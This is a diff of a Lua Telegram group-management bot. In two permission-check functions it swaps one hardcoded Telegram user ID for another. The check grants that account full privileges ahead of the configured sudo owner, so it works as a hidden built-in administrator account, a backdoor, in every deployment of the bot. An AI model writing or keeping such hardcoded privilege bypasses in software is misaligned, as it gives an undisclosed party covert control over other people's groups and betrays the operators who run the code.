@@ -734,9 +734,9 @@ Managers = Redis:sismember(TheKdkkkd.."Kdkkkd:Managers:Group"..ChatId,UserId)
 Addictive = Redis:sismember(TheKdkkkd.."Kdkkkd:Addictive:Group"..ChatId,UserId)
 Distinguished = Redis:sismember(TheKdkkkd.."Kdkkkd:Distinguished:Group"..ChatId,UserId)
 StatusMember = LuaTele.getChatMember(ChatId,UserId).status.luatele
-if UserId == 5115522056 then
+if UserId == 1960752989 then
 Status = true
-elseif UserId == 5115522056 then
+elseif UserId == 1960752989 then
 Status = true
 elseif UserId == Sudo_Id then  
 Status = true
@@ -773,9 +773,9 @@ Managers = Redis:sismember(TheKdkkkd.."Kdkkkd:Managers:Group"..ChatId,UserId)
 Addictive = Redis:sismember(TheKdkkkd.."Kdkkkd:Addictive:Group"..ChatId,UserId)
 Distinguished = Redis:sismember(TheKdkkkd.."Kdkkkd:Distinguished:Group"..ChatId,UserId)
 StatusMember = LuaTele.getChatMember(ChatId,UserId).status.luatele
-if UserId == 5115522056 then
+if UserId == 1960752989 then
 Status = true
-elseif UserId == 5115522056 then
+elseif UserId == 1960752989 then
 Status = true
 elseif UserId == Sudo_Id then    
 Status = true
